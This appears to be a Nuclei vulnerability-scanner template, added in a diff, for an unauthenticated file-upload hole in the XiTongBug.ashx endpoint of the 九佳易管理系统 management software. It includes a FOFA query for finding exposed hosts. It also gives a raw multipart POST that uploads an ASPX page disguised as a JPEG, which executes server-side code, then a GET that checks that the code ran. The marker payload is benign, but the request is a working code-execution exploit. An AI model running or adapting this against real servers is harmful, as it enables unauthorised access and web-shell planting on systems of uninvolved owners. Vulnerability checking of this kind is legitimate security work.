@@ -1,0 +1,42 @@
+id: jiujia-system-xitongbug-upload
+
+info:
+  name: 九佳易管理系统 XiTongBug.ashx 文件上传接口未授权访问漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="4008-820-967"
+      该组件在处理文件上传请求时未实施有效的身份验证机制，攻击者可构造特定请求直接向XiTongBug.ashx接口提交恶意文件。由于缺乏访问控制与文件类型校验，成功上传后可实现任意代码执行或敏感数据写入，威胁目标系统的完整性与机密性。
+  tags: 九佳易管理系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /XiTongBug.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Accept: */*
+    Connection: close
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Content-Disposition: form-data; name="file"; filename="NTest.aspx"
+    Content-Type: image/jpeg
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+- raw:
+  - |
+    GET /NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
